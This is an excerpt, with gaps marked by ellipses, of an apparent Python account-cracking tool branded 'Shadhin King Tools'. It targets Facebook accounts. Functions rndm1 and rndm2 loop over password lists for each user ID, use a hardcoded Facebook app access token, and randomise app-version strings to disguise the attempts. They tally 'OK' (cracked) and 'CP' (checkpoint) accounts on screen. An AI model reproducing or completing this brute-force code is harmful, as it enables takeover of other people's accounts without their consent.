...
uname =input('\033[1;91m[\033[1;92m•\033[1;91m]\033[1;92m WHAT IS YOUR NAME \033[1;91m: \033[1;35m')
os.system('espeak -a 300 "Assalamualaikum,   "Welcome,   to,  Shadhin,  King,  Tools"')
def back():
	login()
...
def rndm1(uid,passlist):
        ...
        sys.stdout.write(f'\r\r{B}[{G}[𝐕𝐀𝐈𝐋𝐄𝐍𝐂𝐄-M1]{B}]{G}-{B}[{bo}%s{B}]{G}-{B}[{G}OK•%s{M1}/{G}CP•{G}%s{B}] '%(loop,len(oks),len(cps)));sys.stdout.flush()
        try:
                for pas in passlist:
...
def rndm2(uid,passlist):
        ...
        global oks
        bo = random.choice([m,k,h,b,u,x])
        sys.stdout.write(f'\r\r{B}[{G}[𝐕𝐀𝐈𝐋𝐄𝐍𝐂𝐄-M2]{B}]{G}-{B}[{bo}%s{B}]{G}-{B}[{G}OK•%s{M1}/{G}CP•{G}%s{B}] '%(loop,len(oks),len(cps)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
